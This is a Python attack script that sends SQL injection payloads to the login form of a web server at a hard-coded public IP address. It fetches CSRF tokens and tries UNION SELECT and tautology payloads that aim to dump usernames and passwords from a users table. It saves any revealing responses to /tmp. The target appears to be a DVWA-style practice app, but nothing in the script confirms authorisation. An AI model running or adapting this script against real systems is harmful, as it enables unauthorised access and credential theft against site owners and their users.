
import requests
import re
import time

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"

session = requests.Session()

print("[*] Attempting SQL injection in login form to extract users...")
print("[*] Trying to dump users table via login vulnerability...\n")

# SQL injection payloads for login
sqli_login_payloads = [
    # Try to extract data directly in username field
    ("admin' UNION SELECT NULL,user,password FROM users--", "password"),
    ("admin' UNION SELECT user_id,user,password FROM users--", "password"),
    ("' UNION SELECT NULL,user,password FROM users--", "' OR '1'='1"),
    ("admin' UNION SELECT 1,CONCAT_WS(':',user_id,user,password),password FROM users WHERE user_id > 0--", "x"),
    ("' OR '1'='1", "' OR '1'='1"),
]

for username, password in sqli_login_payloads:
    # Get fresh token
    response = session.get(login_url)
    token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)
    
    if token_match:
        user_token = token_match.group(1)
        
        print(f"[*] Trying: username='{username[:50]}...' password='{password}'")
        
        data = {
            "username": username,
            "password": password,
            "user_token": user_token,
            "Login": "Login"
        }
        
        try:
            response = session.post(login_url, data=data, allow_redirects=False, timeout=10)
            
            # Check for error messages that might contain data
            if "user" in response.text.lower() or "password" in response.text.lower():
                # Extract relevant error or info messages
                lines = response.text.split('\n')
                for line in lines:
                    if 'user' in line.lower() or 'password' in line.lower() or 'admin' in line.lower():
                        if '<' in line and '>' in line:
                            print(f"[+] {line.strip()[:150]}")
                
                # Save interesting responses
                if len(response.text) < 10000:  # Avoid saving huge files
                    with open(f"/tmp/login_response_{username[:15]}.html", "w") as f:
                        f.write(response.text)
        except Exception as e:
            print(f"[-] Error: {e}")
        
        time.sleep(0.5)  # Be gentle with the server

print("\n[*] Done attempting login SQL injection")

